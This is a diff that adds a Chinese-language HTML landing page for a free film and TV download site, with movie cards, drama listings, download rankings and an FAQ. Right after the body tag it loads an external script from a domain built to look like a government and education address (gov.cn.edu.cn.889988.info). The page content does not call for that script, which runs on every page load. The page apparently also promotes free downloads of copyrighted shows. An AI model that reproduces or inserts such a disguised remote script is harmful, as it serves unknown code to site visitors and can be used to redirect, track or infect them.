@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="小小影视免费下载 - 提供海量高清影视资源免费下载与在线观看，最新电影、热门剧集、动漫综艺一站直达。">
+<meta name="keywords" content="小小影视免费下载,影视下载,免费电影,在线观看,高清剧集,动漫下载">
+<meta name="author" content="小小影视免费下载">
+<meta name="theme-color" content="#0f172a">
+<title>小小影视免费下载 - 高清影视资源免费下载与在线观看平台</title>
+<style>
+  :root{
+    --bg:#0f172a; --bg2:#1e293b; --card:#182233; --line:#2a3a52;
+    --txt:#e2e8f0; --sub:#94a3b8; --gold:#f5b642; --cyan:#22d3ee;
+    --pink:#f472b6; --green:#4ade80; --radius:14px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:linear-gradient(180deg,#0b1120,#0f172a 40%,#0b1120);
+    color:var(--txt); line-height:1.7; -webkit-font-smoothing:antialiased;
+  }
+  a{color:var(--cyan);text-decoration:none}
+  img{max-width:100%;display:block}
+  .wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+  .section-title{font-size:1.6rem;font-weight:800;margin:2.5rem 0 1.2rem;display:flex;align-items:center;gap:.6rem}
+  .section-title::before{content:"";width:5px;height:1.4em;background:linear-gradient(var(--gold),var(--pink));border-radius:4px}
+
+  /* ===== 导航 ===== */
+  header{position:sticky;top:0;z-index:50;backdrop-filter:blur(10px);background:rgba(11,17,32,.85);border-bottom:1px solid var(--line)}
+  .nav{display:flex;align-items:center;gap:1rem;padding:12px 0}
+  .logo{font-weight:900;font-size:1.25rem;color:var(--gold);white-space:nowrap}
+  .logo span{color:var(--cyan)}
+  nav.menu{margin-left:auto;display:flex;gap:.4rem;flex-wrap:wrap}
+  nav.menu a{padding:8px 14px;border-radius:999px;font-size:.9rem;color:var(--txt);border:1px solid transparent;transition:.2s}
+  nav.menu a:hover{border-color:var(--gold);color:var(--gold)}
+  .menu-toggle{display:none;background:none;border:none;color:var(--txt);font-size:1.6rem;cursor:pointer}
+
+  /* ===== Hero ===== */
+  .hero{position:relative;overflow:hidden;padding:3.5rem 0 2rem;text-align:center}
+  .hero h1{font-size:clamp(1.8rem,5vw,3rem);font-weight:900;background:linear-gradient(90deg,var(--gold),var(--pink),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent;line-height:1.25}
+  .hero p{color:var(--sub);margin:1rem auto;max-width:640px}
+  .hero .btns{display:flex;gap:.8rem;justify-content:center;flex-wrap:wrap;margin-top:1.5rem}
+  .btn{padding:12px 26px;border-radius:999px;font-weight:700;transition:.2s;cursor:pointer;border:none}
+  .btn-gold{background:var(--gold);color:#1a1200}
+  .btn-gold:hover{filter:brightness(1.1);transform:translateY(-2px)}
+  .btn-ghost{background:transparent;color:var(--txt);border:1px solid var(--line)}
+  .btn-ghost:hover{border-color:var(--cyan);color:var(--cyan)}
+
+  /* ===== 栏目一：最新电影（卡片网格） ===== */
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px}
+  .film{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.25s}
+  .film:hover{transform:translateY(-5px);border-color:var(--gold);box-shadow:0 10px 25px rgba(245,182,66,.15)}
+  .poster{aspect-ratio:2/3;background:linear-gradient(135deg,#334155,#0f172a);display:flex;align-items:center;justify-content:center;font-size:2rem}
+  .film .info{padding:12px}
+  .film h3{font-size:1rem;margin-bottom:4px}
+  .film small{color:var(--sub)}
+
+  /* ===== 栏目二：热门剧集（横向时间线） ===== */
+  .timeline{border-left:2px solid var(--line);padding-left:20px;margin-left:8px}
+  .tl-item{position:relative;padding:0 0 22px}
+  .tl-item::before{content:"";position:absolute;left:-27px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--cyan);box-shadow:0 0 0 4px var(--bg2)}
+  .tl-item h3{color:var(--gold);font-size:1.1rem}
+  .tl-item p{color:var(--sub);font-size:.95rem}
+  .tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:6px}
+  .tags i{font-style:normal;font-size:.75rem;padding:3px 10px;border-radius:999px;background:var(--bg2);color:var(--cyan);border:1px solid var(--line)}
+
+  /* ===== 栏目三：动漫综艺（封面墙瀑布） ===== */
+  .masonry{column-count:2;column-gap:14px}
+  .masonry .brick{break-inside:avoid;margin-bottom:14px;border-radius:var(--radius);overflow:hidden;border:1px solid var(--line);background:var(--bg2)}
+  .masonry .brick .thumb{height:120px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;font-weight:800}
+  .masonry .brick .body{padding:12px}
+  .masonry .brick h4{margin-bottom:4px}
+  .masonry .brick span{font-size:.8rem;color:var(--sub)}
+
+  /* ===== 栏目四：影视资讯（列表+摘要） ===== */
+  .news article{border-bottom:1px dashed var(--line);padding:16px 0}
+  .news article:last-child{border:none}
+  .news .meta{font-size:.8rem;color:var(--gold);margin-bottom:4px}
+  .news h3{font-size:1.15rem;margin-bottom:6px}
+  .news p{color:var(--sub);font-size:.95rem}
+
+  /* ===== 栏目五：下载排行（表格） ===== */
+  .top-table{width:100%;border-collapse:collapse;background:var(--card);border-radius:var(--radius);overflow:hidden}
+  .top-table th,.top-table td{padding:12px 14px;text-align:left;border-bottom:1px solid var(--line)}
+  .top-table th{background:var(--bg2);color:var(--gold);font-size:.9rem}
+  .top-table td .rank{display:inline-block;width:26px;height:26px;line-height:26px;text-align:center;border-radius:6px;background:var(--bg2);color:var(--sub);font-weight:700}
+  .top-table td .rank.top3{background:linear-gradient(var(--gold),#d97706);color:#1a1200}
+  .top-table tr:hover td{background:rgba(34,211,238,.05)}
+
+  /* ===== 栏目六：关于/说明（折叠面板） ===== */
+  details.faq{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);margin-bottom:12px;padding:0 18px}
+  details.faq summary{cursor:pointer;padding:16px 0;font-weight:700;list-style:none;display:flex;justify-content:space-between;align-items:center}
+  details.faq summary::after{content:"+";color:var(--gold);font-size:1.4rem}
+  details.faq[open] summary::after{content:"−"}
+  details.faq p{color:var(--sub);padding-bottom:16px;font-size:.95rem}
+
+  /* ===== 底部 ===== */
+  footer{border-top:1px solid var(--line);margin-top:3rem;padding:2rem 0;color:var(--sub);font-size:.85rem;text-align:center}
+  footer a{color:var(--cyan);margin:0 6px}
+
+  /* ===== 移动端 ===== */
+  @media(max-width:720px){
+    .menu-toggle{display:block;margin-left:auto}
+    nav.menu{display:none;position:absolute;top:100%;left:0;right:0;background:var(--bg2);flex-direction:column;padding:12px;margin-left:0;border-bottom:1px solid var(--line)}
+    nav.menu.show{display:flex}
+    nav.menu a{width:100%;text-align:center}
+    .masonry{column-count:1}
+    .hero{padding:2rem 0 1.5rem}
+    .section-title{font-size:1.35rem}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+<header>
+  <div class="wrap nav">
+    <div class="logo">小小影视<span>免费下载</span></div>
+    <button class="menu-toggle" aria-label="菜单" onclick="document.getElementById('menu').classList.toggle('show')">☰</button>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#movie">最新电影</a>
+      <a href="#drama">热门剧集</a>
+      <a href="#anime">动漫综艺</a>
+      <a href="#news">影视资讯</a>
+      <a href="#top">下载排行</a>
+      <a href="#about">关于我们</a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="wrap hero" id="home">
+  <h1>小小影视免费下载<br>海量高清影视 一站直达</h1>
+  <p>小小影视免费下载平台为您提供最新电影、热门电视剧、动漫综艺的高清资源免费下载与在线观看，更新快、画质高、分类全。</p>
+  <div class="btns">
+    <a class="btn btn-gold" href="#movie">立即看片</a>
+    <a class="btn btn-ghost" href="#top">下载排行</a>
+  </div>
+</section>
+
+<!-- 栏目一：最新电影（卡片网格 DOM） -->
+<section class="wrap" id="movie">
+  <h2 class="section-title">🎬 最新电影</h2>
+  <div class="grid">
+    <article class="film"><div class="poster">🎞️</div><div class="info"><h3>狂飙行动</h3><small>动作 / 2026 / 1080P</small></div></article>
+    <article class="film"><div class="poster">🕵️</div><div class="info"><h3>暗夜追凶</h3><small>悬疑 / 2026 / 4K</small></div></article>
+    <article class="film"><div class="poster">💖</div><div class="info"><h3>春日来信</h3><small>爱情 / 2025 / 蓝光</small></div></article>
+    <article class="film"><div class="poster">🚀</div><div class="info"><h3>星际远征</h3><small>科幻 / 2026 / 4K</small></div></article>
+    <article class="film"><div class="poster">🐉</div><div class="info"><h3>龙渊传说</h3><small>奇幻 / 2025 / 1080P</small></div></article>
+    <article class="film"><div class="poster">😂</div><div class="info"><h3>爆笑一家人</h3><small>喜剧 / 2026 / 1080P</small></div></article>
+  </div>
+</section>
+
+<!-- 栏目二：热门剧集（时间线 DOM） -->
+<section class="wrap" id="drama">
+  <h2 class="section-title">📺 热门剧集</h2>
+  <div class="timeline">
+    <div class="tl-item">
+      <h3>长风渡·第二季</h3>
+      <p>权谋大戏回归，剧情层层反转，全网热度榜首，高清全集在线观看。</p>
+      <div class="tags"><i>古装</i><i>权谋</i><i>40集全</i><i>更新中</i></div>
+    </div>
+    <div class="tl-item">
+      <h3>都市星光</h3>
+      <p>都市情感群像剧，讲述职场与家庭的成长故事，口碑持续走高。</p>
+      <div class="tags"><i>都市</i><i>情感</i><i>32集</i></div>
+    </div>
+    <div class="tl-item">
+      <h3>法医秦明·重启</h3>
+      <p>悬疑刑侦经典回归，案件改编自真实事件，烧脑刺激。</p>
+      <div class="tags"><i>悬疑</i><i>刑侦</i><i>24集</i></div>
+    </div>
+    <div class="tl-item">
+      <h3>山河月明</h3>
+      <p>历史正剧，服化道精良，再现大明风云，画面质感媲美电影。</p>
+      <div class="tags"><i>历史</i><i>正剧</i><i>50集全</i></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：动漫综艺（瀑布流 DOM） -->
+<section class="wrap" id="anime">
+  <h2 class="section-title">🎨 动漫综艺</h2>
+  <div class="masonry">
+    <div class="brick"><div class="thumb" style="background:linear-gradient(135deg,#6366f1,#a855f7)">⚔️ 斗破苍穹</div><div class="body"><h4>斗破苍穹·年番</h4><span>热血 / 更新至120话</span></div></div>
+    <div class="brick"><div class="thumb" style="background:linear-gradient(135deg,#ec4899,#f43f5e)">🎤 歌手2026</div><div class="body"><h4>歌手2026</h4><span>音乐 / 每周五更新</span></div></div>
+    <div class="brick"><div class="thumb" style="background:linear-gradient(135deg,#14b8a6,#3b82f6)">🦊 狐妖小红娘</div><div class="body"><h4>狐妖小红娘</h4><span>恋爱 / 全集</span></div></div>
+    <div class="brick"><div class="thumb" style="background:linear-gradient(135deg,#f59e0b,#ef4444)">🏃 奔跑吧</div><div class="body"><h4>奔跑吧·特别季</h4><span>真人秀 / 热播中</span></div></div>
+    <div class="brick"><div class="thumb" style="background:linear-gradient(135deg,#22c55e,#16a34a)">🧙 一人之下</div><div class="body"><h4>一人之下·剧场版</h4><span>奇幻 / 剧场版</span></div></div>
+    <div class="brick"><div class="thumb" style="background:linear-gradient(135deg,#0ea5e9,#2563eb)">🎭 脱口秀大会</div><div class="body"><h4>脱口秀大会</h4><span>喜剧 / 第六季</span></div></div>
+  </div>
+</section>
+
+<!-- 栏目四：影视资讯（列表摘要 DOM） -->
+<section class="wrap news" id="news">
+  <h2 class="section-title">📰 影视资讯</h2>
+  <article>
+    <div class="meta">2026-10-20 · 行业动态</div>
+    <h3><a href="#news">国庆档票房创新高，多部国产片表现亮眼</a></h3>
+    <p>小小影视免费下载为您盘点国庆档期多部影片的票房表现与口碑走势，多部作品实现票房口碑双丰收。</p>
+  </article>
+  <article>
+    <div class="meta">2026-10-15 · 新片推荐</div>
+    <h3><a href="#news">本周必看：5部高分冷门佳作推荐</a></h3>
+    <p>避开热门，这些小成本制作的影片凭借扎实剧本赢得观众认可，适合静下心慢慢品味。</p>
+  </article>
+  <article>
+    <div class="meta">2026-10-08 · 观影指南</div>
+    <h3><a href="#news">家庭观影指南：适合全家一起看的高分电影</a></h3>
+    <p>周末陪家人一起看电影？这份合家欢片单温暖治愈，老少皆宜，画质高清免费下载。</p>
+  </article>
+</section>
+
+<!-- 栏目五：下载排行（表格 DOM） -->
+<section class="wrap" id="top">
+  <h2 class="section-title">🏆 下载排行</h2>
+  <table class="top-table">
+    <thead><tr><th>排名</th><th>影片名称</th><th>类型</th><th>热度</th></tr></thead>
+    <tbody>
+      <tr><td><span class="rank top3">1</span></td><td>狂飙行动</td><td>动作</td><td>98.6万</td></tr>
+      <tr><td><span class="rank top3">2</span></td><td>长风渡·第二季</td><td>古装</td><td>92.1万</td></tr>
+      <tr><td><span class="rank top3">3</span></td><td>斗破苍穹·年番</td><td>动漫</td><td>87.4万</td></tr>
+      <tr><td><span class="rank">4</span></td><td>暗夜追凶</td><td>悬疑</td><td>76.0万</td></tr>
+      <tr><td><span class="rank">5</span></td><td>歌手2026</td><td>综艺</td><td>68.5万</td></tr>
+      <tr><td><span class="rank">6</span></td><td>春日来信</td><td>爱情</td><td>60.2万</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- 栏目六：关于（折叠面板 DOM） -->
+<section class="wrap" id="about">
+  <h2 class="section-title">ℹ️ 关于我们</h2>
+  <details class="faq" open><summary>小小影视免费下载是什么？</summary>
+    <p>小小影视免费下载是一个专注于高清影视资源免费下载与在线观看的信息聚合平台，涵盖电影、电视剧、动漫、综艺等多种分类，致力于为用户提供便捷的一站式影视入口。</p></details>
+  <details class="faq"><summary>如何免费下载影视资源？</summary>
+    <p>进入对应栏目找到您想看的影片，点击详情页即可查看免费下载与在线观看的相关入口，支持多种清晰度选择。</p></details>
+  <details class="faq"><summary>网站是否收费？</summary>
+    <p>本站提供的影视下载与观看入口均为免费，小小影视免费下载坚持无广告、无会员门槛的服务理念。</p></details>
+  <details class="faq"><summary>内容更新频率如何？</summary>
+    <p>我们每日更新最新院线电影、热播剧集及动漫综艺，确保资源紧跟热点，满足您的观影需求。</p></details>
+</section>
+
+<footer>
+  <div>© 2026 <strong>小小影视免费下载</strong> · 网址：<a href="https://xiaoxiaoyingshimianfeixiazai-cn.github.io">xiaoxiaoyingshimianfeixiazai-cn.github.io</a></div>
+  <div style="margin-top:8px">本网站为影视信息展示页面，资源均来自第三方公开信息，仅供交流学习使用。</div>
+</footer>
+
+<script>
+  // 移动端菜单：点击链接后自动收起
+  document.querySelectorAll('#menu a').forEach(function(a){
+    a.addEventListener('click',function(){document.getElementById('menu').classList.remove('show');});
+  });
+</script>
+</body>
+</html>
